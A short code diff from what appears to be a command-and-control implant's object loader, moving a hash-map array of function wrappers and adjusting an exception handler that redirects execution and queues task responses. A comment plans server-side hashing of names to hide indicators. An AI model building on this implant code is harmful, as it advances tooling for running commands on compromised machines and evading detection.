@@ -1,12 +1,20 @@
 #include <core/include/objects.hpp>
 namespace Objects {
-
     LPVOID FunctionReturn = nullptr;
+
+    _hash_map wrappers[] = {
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+        { .name = 0, .address = nullptr },
+    };
 
     LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS exception) {
 
-        uint32_t    task_id = 0;
-        _stream     *stream = Stream::CreateTaskResponse(TypeExecute);
+        _stream *stream = Stream::CreateTaskResponse(TypeExecute);
 
         exception->ContextRecord->IP_REG = (uint64_t)(U_PTR(FunctionReturn));
 
@@ -17,10 +25,6 @@ namespace Objects {
         Dispatcher::MessageQueue(stream);
         return EXCEPTION_CONTINUE_EXECUTION;
     }
-
-    _hash_map wrappers[] = {
-        { .name = 0, .address = nullptr },
-    };
 
     BOOL ProcessSymbol(uint8_t* symbol_data, void** function) {
         // todo: all names and indicators should be hashed server side TYPE_HASH:FN_HASH:(OPT)LIB_HASH
